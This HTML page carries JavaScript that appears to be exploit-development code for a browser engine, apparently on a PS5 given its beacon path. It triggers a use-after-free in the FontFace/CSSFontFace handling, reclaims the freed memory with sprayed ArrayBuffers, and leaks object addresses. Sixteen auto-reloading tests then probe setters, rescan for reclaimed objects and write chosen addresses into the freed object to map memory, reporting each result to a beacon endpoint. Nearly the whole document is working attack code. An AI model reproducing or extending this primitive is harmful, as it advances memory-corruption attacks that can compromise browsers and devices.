<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>P844v18</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
#log{white-space:pre-wrap;word-break:break-all}
</style>
</head>
<body>
<div id="log"></div>
<script>
var L=document.getElementById('log');
function log(s){L.textContent+=s+'\n';}
function bn(tag,data){
  try{
    var x=new XMLHttpRequest();
    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
    x.send();
  }catch(e){}
}
var KEY='p844v18_test';
function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
var testNum=getTest();
log('P844v18 BOOT test='+testNum);
bn('P844v18-BOOT','test='+testNum);

function doUAF(id,cb){
  var st=document.createElement('style');
  st.textContent="@font-face{font-family:'UAF"+id+"';src:local(Arial);unicode-range:U+0042;}";
  document.head.appendChild(st);
  var face=new FontFace('UAF'+id+'F',"local('Helvetica')",{unicodeRange:'U+0041'});
  document.fonts.add(face);void face.loaded;
  var fabs=[],ffired=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){if(ffired)return undefined;ffired=true;
      st.remove();st.textContent='';st=null;
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
      document.body.offsetHeight;
      return undefined;
    },set:function(){}});
  document.fonts.load('1em UAF'+id+'F,UAF'+id,'AB').then(function(){}).catch(function(){});
  setTimeout(function(){
    delete FontFace.prototype.then;
    var hi=-1,bv=null;
    for(var i=0;i<fabs.length;i++){var t=new BigUint64Array(fabs[i]);if(t[0]!==0n||t[11]!==0n){hi=i;bv=t;break;}}
    cb(bv?{abs:fabs,bv:bv,face:face,hitIdx:hi}:null);
  },800);
}
function fin(tag,data){bn(tag,data);log(tag.replace('P844v18-','')+': '+data);setTimeout(function(){location.reload();},100);}

// Gate ON: suppress bg process pointer following
function gateOn(bv,self){bv[0]=0x100000001n;for(var i=1;i<24;i++)bv[i]=self;}

// Snapshot all 192 bytes
function snapAll(ab){var u=new Uint8Array(ab);var s=new Uint8Array(192);for(var i=0;i<192;i++)s[i]=u[i];return s;}
// Diff two snapshots, return changed byte offsets
function diffSnap(before,after){
  var ch=[];
  for(var i=0;i<192;i++){
    if(before[i]!==after[i])ch.push('+'+i+'=0x'+before[i].toString(16)+'->0x'+after[i].toString(16));
  }
  return ch.length?ch.join(','):'none';
}

var TESTS=[

// ============================================================
// T0: face.family SETTER — does it write through m_backing?
// Set gate ON (safe), snapshot, call face.family="ZZZZ", diff
// ============================================================
function(){
  setTest(1);
  doUAF('T0',function(r){
    if(!r)return fin('P844v18-T0-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='';
    try{r.face.family='ZZZZ';}catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v18-T0-OK','setter=family|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T1: face.style SETTER
// ============================================================
function(){
  setTest(2);
  doUAF('T1',function(r){
    if(!r)return fin('P844v18-T1-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='';
    try{r.face.style='italic';}catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v18-T1-OK','setter=style|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T2: face.weight SETTER
// ============================================================
function(){
  setTest(3);
  doUAF('T2',function(r){
    if(!r)return fin('P844v18-T2-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='';
    try{r.face.weight='bold';}catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v18-T2-OK','setter=weight|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T3: face.display SETTER
// ============================================================
function(){
  setTest(4);
  doUAF('T3',function(r){
    if(!r)return fin('P844v18-T3-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='';
    try{r.face.display='swap';}catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v18-T3-OK','setter=display|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T4: face.stretch SETTER
// ============================================================
function(){
  setTest(5);
  doUAF('T4',function(r){
    if(!r)return fin('P844v18-T4-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='';
    try{r.face.stretch='condensed';}catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v18-T4-OK','setter=stretch|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T5: face.unicodeRange SETTER
// ============================================================
function(){
  setTest(6);
  doUAF('T5',function(r){
    if(!r)return fin('P844v18-T5-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='';
    try{r.face.unicodeRange='U+0020-007F';}catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v18-T5-OK','setter=unicodeRange|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T6: face.featureSettings SETTER
// ============================================================
function(){
  setTest(7);
  doUAF('T6',function(r){
    if(!r)return fin('P844v18-T6-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='';
    try{r.face.featureSettings='"liga" 1';}catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v18-T6-OK','setter=featureSettings|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T7: face.variant SETTER (CSS font-variant — might exist)
// ============================================================
function(){
  setTest(8);
  doUAF('T7',function(r){
    if(!r)return fin('P844v18-T7-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='';
    try{r.face.variant='small-caps';}catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v18-T7-OK','setter=variant|err='+(err||'none')+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T8: document.fonts.add(face) AGAIN — re-adding after UAF
// Does it dereference m_backing?
// ============================================================
function(){
  setTest(9);
  doUAF('T8',function(r){
    if(!r)return fin('P844v18-T8-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='',ret='?';
    try{ret=String(document.fonts.add(r.face));}catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v18-T8-OK','op=fontsAdd|err='+(err||'none')+'|ret='+ret+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T9: document.fonts.delete(face) AGAIN
// ============================================================
function(){
  setTest(10);
  doUAF('T9',function(r){
    if(!r)return fin('P844v18-T9-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='',ret='?';
    try{ret=String(document.fonts.delete(r.face));}catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v18-T9-OK','op=fontsDel|err='+(err||'none')+'|ret='+ret+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T10: SETTER WITH GATE OFF — family setter without gate
// If setter writes through m_backing AND the bg process sees the
// write, this tests if the setter causes a bg-visible mutation
// ============================================================
function(){
  setTest(11);
  doUAF('T10',function(r){
    if(!r)return fin('P844v18-T10-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    // Keep original CSSFontFace data (gate OFF, natural state)
    // Just snapshot and try setter
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='';
    try{r.face.family='XXXX';}catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    // Also read back the property
    var readback='?';
    try{readback=r.face.family;}catch(e){readback='ERR';}
    fin('P844v18-T10-OK','setter=family_nogate|err='+(err||'none')+'|diff='+diff+'|rb='+readback+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T11: Try to CONSTRUCT a new FontFace using the face's backing
// new FontFace(face.family, face.src) — does the constructor
// access any internal state?
// ============================================================
function(){
  setTest(12);
  doUAF('T11',function(r){
    if(!r)return fin('P844v18-T11-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    var snap=snapAll(r.abs[r.hitIdx]);
    var err='',props='';
    try{
      var f2=new FontFace(r.face.family,"local('Helvetica')",{
        style:r.face.style,weight:r.face.weight,
        unicodeRange:r.face.unicodeRange,display:r.face.display
      });
      props='fam='+f2.family+'|st='+f2.status;
    }catch(e){err=e.message.substring(0,40);}
    var diff=diffSnap(snap,new Uint8Array(r.abs[r.hitIdx]));
    fin('P844v18-T11-OK','op=newFontFace|err='+(err||'none')+'|props='+props+'|diff='+diff+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T12: Check ALL face prototype methods/props via Object.getOwnPropertyNames
// Find any method we haven't tested
// ============================================================
function(){
  setTest(13);
  doUAF('T12',function(r){
    if(!r)return fin('P844v18-T12-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    gateOn(r.bv,self);
    // Enumerate all FontFace prototype properties
    var proto=FontFace.prototype;
    var names=[];
    try{names=Object.getOwnPropertyNames(proto);}catch(e){}
    // Also check instance
    var inames=[];
    try{inames=Object.getOwnPropertyNames(r.face);}catch(e){}
    fin('P844v18-T12-OK','proto='+names.join(';')+'|inst='+inames.join(';')+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T13: SECOND RECLAIM SCAN — find ALL hit ABs, not just first
// Maybe the second CSSFontFace was also reclaimed!
// ============================================================
function(){
  setTest(14);
  doUAF('T13',function(r){
    if(!r)return fin('P844v18-T13-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    // Scan ALL 80 ABs for hits
    var hits=[];
    for(var i=0;i<r.abs.length;i++){
      var t=new BigUint64Array(r.abs[i]);
      if(t[0]!==0n||t[11]!==0n){
        var addr=t[11]-0x58n;
        hits.push('i'+i+'=0x'+addr.toString(16)+'|q0=0x'+t[0].toString(16)+'|q13=0x'+t[13].toString(16));
      }
    }
    fin('P844v18-T13-OK','hits='+hits.length+'|'+hits.join('||')+'|self=0x'+self.toString(16));
  });
},

// ============================================================
// T14: LOWER VA SCAN — test addresses below 0x200000000
// Code might be at very low VA (FreeBSD PIE base)
// Test: 0x10000000(256M), 0x40000000(1G), 0x80000000(2G), 0x100000000(4G)
// ============================================================
function(){
  setTest(15);
  doUAF('T14',function(r){
    if(!r)return fin('P844v18-T14-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    var targets=[0x10000000n,0x40000000n,0x80000000n,0x100000000n];
    var tnames=['256M','1G','2G','4G'];
    var results=[];
    var idx=0;
    function testNext(){
      if(idx>=targets.length){
        fin('P844v18-T14-OK','lowVA='+results.join(',')+' |self=0x'+self.toString(16));
        return;
      }
      var tgt=targets[idx];
      var name=tnames[idx];
      gateOn(r.bv,self);
      setTimeout(function(){
        // Gate OFF with target
        r.bv[0]=1n;
        r.bv[1]=tgt;
        for(var i=2;i<24;i++)r.bv[i]=self;
        setTimeout(function(){
          // If we're still alive, this target survived
          gateOn(r.bv,self);
          results.push(name+'=ALIVE');
          idx++;
          testNext();
        },500);
      },100);
    }
    testNext();
  });
},

// ============================================================
// T15: HEAP BOUNDARY SCAN — between 0xE00M and 0x1000M
// Binary search for heap start
// Test: 0xF00000000, 0xF80000000, 0xFC0000000, 0xFE0000000
// ============================================================
function(){
  setTest(16);
  doUAF('T15',function(r){
    if(!r)return fin('P844v18-T15-OK','uaf=miss');
    var self=r.bv[11]-0x58n;
    var targets=[0xF00000000n,0xF80000000n,0xFC0000000n,0xFE0000000n];
    var tnames=['0xF00M','0xF80M','0xFC0M','0xFE0M'];
    var results=[];
    var idx=0;
    function testNext(){
      if(idx>=targets.length){
        fin('P844v18-T15-OK','heapBound='+results.join(',')+' |self=0x'+self.toString(16));
        return;
      }
      var tgt=targets[idx];
      var name=tnames[idx];
      gateOn(r.bv,self);
      setTimeout(function(){
        r.bv[0]=1n;
        r.bv[1]=tgt;
        for(var i=2;i<24;i++)r.bv[i]=self;
        setTimeout(function(){
          gateOn(r.bv,self);
          results.push(name+'=ALIVE');
          idx++;
          testNext();
        },500);
      },100);
    }
    testNext();
  });
}
];

var NAMES=['T0-setFamily','T1-setStyle','T2-setWeight','T3-setDisplay','T4-setStretch',
  'T5-setUnicodeRange','T6-setFeatureSettings','T7-setVariant',
  'T8-fontsAddAgain','T9-fontsDelAgain','T10-setFamilyNoGate',
  'T11-newFontFace','T12-protoEnum','T13-multiHitScan','T14-lowVA','T15-heapBound'];

function runTest(){
  if(testNum>=TESTS.length){
    log('ALL '+TESTS.length+' TESTS COMPLETE');
    bn('P844v18-DONE','all='+TESTS.length);
    clearTest();return;
  }
  log('Running '+NAMES[testNum]+'...');
  try{TESTS[testNum]();}catch(e){
    bn('P844v18-'+NAMES[testNum]+'-ERR',e.message);
    setTest(testNum+1);setTimeout(function(){location.reload();},100);
  }
}
setTimeout(runTest,200);
</script>
</body>
</html>
